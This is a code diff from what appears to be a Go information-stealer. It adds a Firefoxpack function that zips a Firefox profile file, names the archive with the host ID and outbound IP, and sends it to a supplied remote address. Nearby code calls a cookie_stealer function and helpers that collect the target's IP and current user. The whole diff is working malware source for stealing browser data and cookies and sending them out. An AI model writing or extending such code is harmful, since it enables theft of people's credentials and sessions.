@@ -35,13 +35,31 @@ func get_targetip() string {
 }
 
 //create a dir
-func create_dir() {
-	err := os.MkdirAll(Safe_path, 0711)
+func create_dir(path string) {
+	err := os.MkdirAll(path, 0711)
 	if err != nil {
 		log.Fatal(err)
 	}
 }
-
+func Firefoxpack(addr string) {
+	fire, err := os.Open(lib.Firefoxpath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer fire.Close()
+	var files = []*os.File{fire}
+	// if not create dir faild not write
+	create_dir(lib.Firefox)
+	lib.GetOutIp()
+	dest := lib.Firefox + lib.HOSTID + "-" + lib.OUTIP + "-fire.zip"
+	err = lib.Compress(files, dest)
+	if err != nil {
+		log.Fatal(err, "targeterr")
+	} else {
+		finflag := make(chan string)
+		go lib.SingleFile(dest, addr, finflag)
+	}
+}
 func Digpack(addr string, finflag chan string) {
 	logf, lerr := os.Stat(Safe_path)
 	if lerr == nil {
@@ -55,7 +73,7 @@ func Digpack(addr string, finflag chan string) {
 	}
 	if os.IsNotExist(lerr) {
 		get_current_user()
-		create_dir()
+		create_dir(Safe_path)
 		// if not return will happen nil bug
 		berr := cookie_stealer(addr)
 		if berr != nil {
